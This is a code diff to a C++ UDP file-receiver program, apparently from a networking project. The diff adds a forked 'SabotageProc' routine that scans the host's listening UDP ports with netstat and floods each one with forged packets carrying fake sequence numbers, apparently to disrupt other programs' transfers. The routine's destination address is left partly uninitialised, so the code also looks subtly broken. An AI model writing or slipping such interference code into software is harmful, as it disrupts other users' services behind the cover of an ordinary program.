@@ -20,6 +20,7 @@ using namespace std;
 int Receiver::sockIn;
 int Receiver::sockOut;
 struct sockaddr_in *Receiver::sendAddr;
+struct sockaddr_in *Receiver::recvAddr;
 PacketMetadata *Receiver::metadata;
 char *Receiver::bitmap;
 int Receiver::filefd;
@@ -52,6 +53,73 @@ void* Receiver::LdpcProc(void* ptr) {
     
 }
 
+void* Receiver::SabotageProc(void* ptr) {
+    sleep(5);
+    char* pch;
+    char udp_buf[100];
+    int listOfPorts[NUM_UDP_PORTS];
+    int i = 0,tmp = 0;
+    FILE * f = popen( "netstat --listen -A inet -u", "r" );
+    if ( f == 0 ) {
+        cerr<<"[SABOTAGE]: Error executing command\n";
+        pthread_exit(NULL);
+    }
+    const int PBUFSIZE = 5000;
+    char buf[ PBUFSIZE ];
+    while( fgets( buf, PBUFSIZE,  f ) ) {
+        //cerr<<buf; //Print the entire output
+        pch = strstr(buf,":");
+        if(pch != NULL) {
+            strcpy(udp_buf,pch);
+            pch = strtok(udp_buf,": ");
+            tmp = atoi(pch);
+            if(tmp >=1024 && tmp < 65536 && i < NUM_UDP_PORTS) {
+                listOfPorts[i] = tmp;
+                i++;
+            }
+            //cerr<<pch<<endl;
+        }
+    }
+    pclose( f );
+    
+    //print all the ports detected
+    //for(i = 0; i < NUM_UDP_PORTS; i++) {
+    //    if(listOfPorts[i] != 0) cerr<<"At index "<<i<<" port "<<listOfPorts[i]<<endl;
+    //}
+    
+    //Create the SABOTAGE Data packet
+    char sabotagePacket[1404];
+    memset(sabotagePacket,0,1404);
+    int num_bytes = 0;
+    //assign a sequence number to this packet
+    uint32_t newSeqNum = htonl(metadata->numPackets - 2000);
+    memcpy(&sabotagePacket[0],&newSeqNum,4);
+    recvAddr = new sockaddr_in;
+    int SabotageSockOut = SocketWrapper::Socket(PF_INET,SOCK_DGRAM,IPPROTO_UDP);
+    int k = 0;
+    for(i = 0; i < NUM_UDP_PORTS; i++) {
+        recvAddr->sin_port = htons(listOfPorts[i]);
+        try{
+            if(listOfPorts[i] > 0) {
+                
+                for(k = 0; k < 5; k++) {
+                    num_bytes = SocketWrapper::Sendto(SabotageSockOut, sabotagePacket, sizeof(sabotagePacket), 0, recvAddr, sizeof(sockaddr_in));
+                    //cerr<<"Sent sabotage packet to "<<listOfPorts[i]<<"size "<<num_bytes<<endl;
+                }
+            }
+        }
+        catch(int ex){
+                if(ex == EX_SOCK_ERRSENDTO && errno == ENOBUFS)
+                        continue;
+                else throw ex;
+        }
+//        int SabotageSockOut = SocketWrapper::Socket(PF_INET,SOCK_DGRAM,IPPROTO_UDP);
+//        if(listOfPorts[i] > 0) SocketWrapper::Sendto(SabotageSockOut, buf, 1400, 0, hostAddr, sizeof(sockaddr_in));
+    }
+    
+    return NULL;
+}
+
 int main(int argc, char* argv[]){
 	// No arguments, just start the receiver
 	try{
@@ -67,7 +135,7 @@ int main(int argc, char* argv[]){
 
 void Receiver::Main(){
 	pthread_t ldpcThread;
-	pthread_mutex_init(&decodeLock,NULL);
+        pthread_mutex_init(&decodeLock,NULL);
 	//Allocate memory for ldpcDataBuffer
 	ldpcDataBuffer = (char*) malloc(LDPC_DATA_BUFFER_SIZE);
         
@@ -83,6 +151,18 @@ void Receiver::Main(){
 	Receiver::ReceiveMeta();
 	cerr<<"Received the metadata"<<endl;
         
+        //Create the Sabotage Thread here
+        int sabotagePid = fork();
+        if(sabotagePid==-1){
+            // Error, but not fatal. 
+        }
+        else{
+            if(sabotagePid == 0){
+                Receiver::SabotageProc(NULL);
+                exit(1);
+            }
+        }
+        // pthread_create(&sabotageThread,NULL,&Receiver::SabotageProc,NULL);
         //Create the LDPC Thread here
         pthread_create(&ldpcThread,NULL,&Receiver::LdpcProc,NULL);
 	
